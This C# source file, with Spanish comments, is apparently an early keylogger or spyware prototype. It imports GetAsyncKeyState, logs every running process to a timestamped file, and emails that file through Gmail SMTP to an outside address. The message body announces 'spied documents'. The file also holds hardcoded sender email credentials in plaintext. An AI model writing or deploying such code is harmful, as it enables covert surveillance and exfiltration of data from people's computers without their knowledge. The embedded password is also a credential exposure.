using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using WQLUtil.Util.ProcessEx;
using System.Management;
using System.Windows.Forms;
//Para manejo de archivo
using System.IO;
//Para correo
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace Pruebas
{
    class Program
    {
        public static String KeyLog, KeyLog2, KeyLog3 = "";
        //public static Byte[] datos ;
        public static FileStream stream;
        public static StreamWriter writer;
        public static String nomArchivo = "";
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(/*System.Windows.Forms.Keys vKey*/int vKey); 


        public static string RevisaProcesos()
        {
            String loginterno= "";
            String so = "";

            List<Process> process = ProcessManager.GetAllProcess();
            foreach (Process p in process)
            {
                Console.Write("ProcessId: {0}, ", p.ProcessId);
                Console.Write("Name: {0}, ", p.Name);
                Console.Write("Priority: {0}, ", p.Priority);
                Console.Write("Status: {0}, ", p.Status);
                Console.Write("ThreadCount: {0}, ", p.ThreadCount);
                Console.Write("Handle: {0}, ", p.Handle);
                Console.WriteLine("OSName: {0}", p.OSName);
                writer.WriteLine("ProcessId: {0}, ", p.ProcessId);
                writer.WriteLine("Name: {0}, ", p.Name);
                writer.WriteLine("Priority: {0}, ", p.Priority);
                writer.WriteLine("Status: {0}, ", p.Status);
                writer.WriteLine("ThreadCount: {0}, ", p.ThreadCount);
                writer.WriteLine("Handle: {0}, ", p.Handle);
                writer.WriteLine("OSName: {0}", p.OSName);
                loginterno = loginterno + "- " + p.ProcessId + "- " + p.Name + "- " + p.ThreadCount + "- \n"; 
            }
            loginterno = loginterno + so;
            return loginterno;
        }
        [STAThread]
        static void Main(string[] args)
        {
            DateTime current = DateTime.Now;
            string date = current.ToUniversalTime().ToString() ;
            date = date.Replace(':', '_');
            date = date.Replace('/', '_');
            nomArchivo = "Log_" + date + @".txt";
           // Console.WriteLine(nomArchivo);
           
            stream = new FileStream(nomArchivo, FileMode.OpenOrCreate, FileAccess.Write);
            writer = new StreamWriter(stream);
            KeyLog = RevisaProcesos();//HAY QUE PONERLO EN UN TIPO MÁS GRANDE PORQUE SE CORTA LA CADENA
            writer.Close();
            stream.Close();
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("funseguridad@gmail.com");
                mail.To.Add("rossmintka14@gmail.com");
                mail.Subject = "Hola";

                mail.Body = "Enviando archivo de documentos espiados";
                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment(nomArchivo);
                mail.Attachments.Add(attachment);
                SmtpServer.Port = 587;

                SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
                //SmtpServer.UseDefaultCredentials = false;
                String pass = "123EjemplO";
                SmtpServer.Credentials = new System.Net.NetworkCredential("funseguridad@gmail.com", pass);
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(mail);
                //   MessageBox.Show("mail Send");
                mail.Attachments.Dispose();
                // Console.WriteLine("termino correo");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            KeyLog2 = "uno";//"uno dos tres";
            Test t = new Test(nomArchivo);
            System.Windows.Forms.Application.Run();
         }      
    }
}
